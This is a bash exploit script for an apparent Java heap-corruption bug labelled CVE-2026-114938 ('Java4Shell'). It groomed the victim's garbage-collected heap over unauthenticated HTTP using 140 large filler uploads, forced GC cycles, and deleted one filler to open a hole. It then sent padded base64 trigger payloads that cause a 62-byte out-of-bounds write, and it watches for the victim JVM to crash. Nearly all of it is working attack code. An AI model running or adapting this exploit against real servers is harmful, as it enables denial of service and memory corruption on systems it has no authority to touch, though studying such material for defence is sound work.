#!/bin/bash
# Java4Shell E2E attacker — wire-driven heap grooming + OOB trigger (CVE-2026-114938)
# usage: e2e_java4shell_attacker.sh <victim-host:port>
#
# Protocol (all attacker-driven over unauthenticated HTTP):
#   [1] build payloads           fill  = "A"*(4m)+"AB"   valid → dst 5242861 (obj = exactly 5 regions)
#                                trig  = "A"*(4k)+"=="   invalid padded → 62B OOB write past dst end
#   [2] fill  ×140               POST /decode?id=f$i  → victim caches decoded bytes = retained fillers
#   [3] cycle                    pump + poll /status until a concurrent mark cycle completes
#   [4] drop  f70                DELETE /decode?id=f70 → unreachable humongous filler
#   [5] cycle                    concurrent cleanup reclaims f70's 5 regions (no compaction) → hole
#   [6] trigger                  POST /decode with padded payload → dst lands in the hole,
#                                62B write crosses the hole end → smashes cached filler f71 header
#   [7] watch                    /health fails = victim JVM dead = PWNED
set -u
V="${1:-victim:18082}"
BASE="http://$V"

echo "════ Java4Shell E2E attacker → $V ════"
curl -sf -m 5 "$BASE/health" >/dev/null || { echo "victim not ready"; exit 1; }
echo "[0] victim alive: $(curl -s -m 5 "$BASE/status")"

# 1. payloads
FILL="$(head -c 6990480 /dev/zero | tr '\0' 'A')AB"
TRIG="$(head -c 6990464 /dev/zero | tr '\0' 'A')=="
printf '%s' "$FILL" > /tmp/fill.bin
printf '%s' "$TRIG" > /tmp/trig.bin
echo "[1] fill=$(wc -c </tmp/fill.bin)B trig=$(wc -c </tmp/trig.bin)B"

cycles() { curl -s -m 5 "$BASE/status" | grep -o '"cycles":[0-9-]*' | cut -d: -f2; }

wait_cycle() { # $1=before  $2=timeout sec
  local before="$1" deadline=$(( $(date +%s) + ${2:-180} ))
  while [ "$(date +%s)" -lt "$deadline" ]; do
    local now; now=$(cycles)
    if [ -n "$now" ] && [ "$now" != "-1" ] && [ "$now" -gt "$before" ]; then echo "$now"; return 0; fi
    curl -s -X POST -m 90 "$BASE/pump?mb=64" >/dev/null
    sleep 1
  done
  echo "$before"
}

# 2. fill — 140 retained 5-region humongous fillers (~700MB)
for i in $(seq 0 139); do
  R=$(curl -s -m 60 -X POST --data-binary @/tmp/fill.bin "$BASE/decode?id=f$i")
  [ $((i % 35)) = 0 ] && echo "[2] fill f$i → ${R:-<none>}"
done
echo "[2] all filled: $(curl -s "$BASE/status")"

# 3. first concurrent cycle
C0=$(cycles); C1=$(wait_cycle "$C0" 240)
echo "[3] cycle: $C0 → $C1"
[ "$C1" -le "$C0" ] && { echo "VERDICT: NO-CYCLE (grooming precondition failed)"; exit 1; }

# 4-5. drop + reclaim → 5-region hole
curl -s -X DELETE "$BASE/decode?id=f70" >/dev/null
echo "[4] dropped f70"
C2=$(wait_cycle "$C1" 240)
echo "[5] reclaim cycle: $C1 → $C2"
[ "$C2" -le "$C1" ] && { echo "VERDICT: NO-RECLAIM-CYCLE"; exit 1; }

# 6. trigger
echo "[6] firing trigger ×5 (first lands in the hole; 62B OOB write)"
for t in 1 2 3 4 5; do
  R=$(curl -s -m 60 -X POST --data-binary @/tmp/trig.bin "$BASE/decode?id=trig$t")
  echo "[6] trigger $t → ${R:-<no response>}"
  curl -s -X POST -m 60 "$BASE/pump?mb=128" >/dev/null 2>&1
  sleep 2
  if ! curl -sf -m 3 "$BASE/health" >/dev/null 2>&1; then
    echo "★★★ VICTIM JVM DEAD after trigger $t ★★★"
    echo "VERDICT: PWNED"
    exit 42
  fi
done

# 7. extended watch — smashed header surfaces on a later GC
for w in $(seq 1 24); do
  sleep 5
  curl -s -X POST -m 30 "$BASE/pump?mb=64" >/dev/null 2>&1 || true
  if ! curl -sf -m 3 "$BASE/health" >/dev/null 2>&1; then
    echo "★★★ VICTIM JVM DEAD (delayed, watch=$w) ★★★"
    echo "VERDICT: PWNED-DELAYED"
    exit 42
  fi
done
echo "VERDICT: SURVIVED (victim alive after full protocol)"
exit 0
